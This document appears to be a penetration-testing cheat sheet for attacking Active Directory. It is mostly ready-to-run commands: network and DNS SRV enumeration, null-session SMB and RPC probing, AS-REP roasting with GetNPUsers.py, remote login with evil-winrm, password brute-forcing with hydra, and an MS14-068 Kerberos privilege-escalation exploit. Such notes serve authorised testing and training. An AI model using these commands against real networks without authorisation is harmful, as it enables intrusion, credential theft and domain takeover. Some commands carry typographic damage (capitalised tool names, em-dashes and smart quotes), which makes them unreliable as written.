An Active Directory environment has a very critical dependency on a Domain Name System (DNS) service. 

A typical domain controller in an AD will also host a DNS server that is authoritative for a given domain.

An attack against Active Directory infrastructure begins with an exploit or client-side attack against a domain workstation or server followed by enumeration of the AD environment.

##### Network scan
```
nmap -script='broadcast-dhcp-discover'
Nbtscan $subnet
```

##### DNS scan
```
Dig -t SRV _gc._tcp.<domain fqdn>

Dig -t SRV _ldap._tcp.<domain fqdn>

Dig -t SRV _kerberos._tcp.<domain fqdn>

Dig -t SRV _kpasswd._tcp.<endpoint fqdn>

­nmap —script dns-srv-enum –script-args “dns-srv-enum.domain=’<domain fqdn>’”

nmap -sT -Pn -n --open -p389 -script='ldap-rootdse'
```

#### enum4linux
```
enum4linux -all $IP
```



##### start off testing null authentication with smbclient, smbmap, rpcclient

looking to foothold, find shares, grab user and group information

```
smbclient -U "" -L \\\\$IP
smbmap -u "" -H $IP
rpcclient -U "" -N $IP
GetADUsers.py -all -dc-ip $IP domain.local/username
```

with user list - GetNPUsers.py
```
sudo python GetNPUsers.py domain.local/ -dc-ip $IP -request -usersfile /home/users.txt
```

with creds - SMB & Evil-WinRM
```
evil-winrm -u username -p password -i $IP
```

bruteforce with hydra
```
hydra -L /home/users.txt -p password smb://$IP
```

##### Kerberos Vulnerability in MS14-068

##### PyKEK (Python Kerberos Exploitation Kit)
[MS14-068](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
```
python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
Password: 
```




